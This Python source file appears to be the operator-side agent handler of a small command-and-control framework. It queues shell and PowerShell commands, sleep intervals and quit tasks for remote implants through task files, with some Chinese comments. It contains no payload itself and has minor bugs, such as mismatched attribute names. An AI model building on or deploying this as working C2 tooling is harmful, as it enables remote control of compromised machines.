import os
import time
from shutil import rmtree

import menu
from common import progress, error, removeFromDatabase, writeToDatabase, agentsDB


class Agent:
    def __init__(self, name, listener, ip, hostname, Type, key):

        self.name = name
        self.listener = listener
        self.ip = ip
        self.hostname = hostname
        self.Type = Type
        self.key = key
        self.sleepTime = 3
        self.Path = "data/listeners/{}/agents/{}/".format(self.listener, self.name)
        self.taskPath = "{}tasks".format(self.Path, self.name)

        if not os.path.exists(self.Path):
            os.mkdir(self.Path)
        # 初始化菜单
        self.menu = menu.Menu(self.name)
        self.menu.registerCommand("shell", "Execute a shell command.", "<command>")
        self.menu.registerCommand("powershell", "Execute a powershell command.", "<command>")
        self.menu.registerCommand("sleep", "Change agent's sleep time.", "<time (s)>")
        self.menu.registerCommand("clear", "Clear tasks.", "")
        self.menu.registerCommand("quit", "Task agent to quit.", "")

        self.menu.uCommands()

        self.Commands = self.menu.Commands

    def writeTask(self, task):
        if self.Type == "p":
            task = "VALID " + task
        # no encryption in the c++ agent
        elif self.Type == "w":
            task = task

        with open(self.tasksPath, "w") as f:
            f.write(task)

    def clearTasks(self):

        if os.path.exists(self.taskPath):
            os.remove(self.taskPath)
        else:
            pass

    def update(self):

        self.menu.name = self.name
        self.Path = "data/listeners/{}/agents/{}/".format(self.listener, self.name)
        self.tasksPath = "{}tasks".format(self.Path, self.name)

        if os.path.exists(self.Path) == False:
            os.mkdir(self.Path)

    def rename(self, newname):

        task = "rename " + newname
        self.writeTask(task)

        progress("Waiting for agent.")
        while os.path.exists(self.tasksPath):
            pass

        return 0

    # 显示用的应该是
    def shell(self, args):

        if len(args) == 0:
            error("Missing command.")
        else:
            command = " ".join(args)
            task    = "shell " + command
            self.writeTask(task)

    # 显示用的应该是
    def powershell(self, args):

        if len(args) == 0:
            error("Missing command.")
        else:
            command = " ".join(args)
            task = "powershell " + command
            self.writeTask(task)

    # TODO: sleep time should be a random number
    def sleep(self, args):

        if len(args) != 1:
            error("Invalid arguments.")
        else:
            time = args[0]

            try:
                temp = int(time)
            except:
                error("Invalid time.")
                return 0

            task = "sleep {}".format(time)
            self.writeTask(task)
            self.sleept = int(time)
            removeFromDatabase(agentsDB, self.name)
            writeToDatabase(agentsDB, self)

    def QuitandRemove(self):

        self.Quit()

        rmtree(self.Path)
        removeFromDatabase(agentsDB, self.name)

        menu.home()

        return 0

    def Quit(self):

        self.writeTask("quit")

        progress("Waiting for agent.")

        for i in range(self.sleept):

            if os.path.exists(self.tasksPath):
                time.sleep(1)
            else:
                break

        return 0

    # event?
    def ev(self, command, args):

        if command == "help":
            self.menu.showHelp()
        elif command == "home":
            menu.home()
        elif command == "exit":
            menu.Exit()
        elif command == "shell":
            self.shell(args)
        elif command == "powershell":
            self.powershell(args)
        elif command == "sleep":
            self.sleep(args)
        elif command == "clear":
            self.clearTasks()
        elif command == "quit":
            self.QuitandRemove()
    # 功能调用应该是，在ev调相应的
    def interact(self):

        self.menu.clearScreen()

        while True:

            try:
                command, args = self.menu.parse()
            except:
                continue

            if command not in self.Commands:
                error("Invalid command.")
            else:
                self.ev(command, args)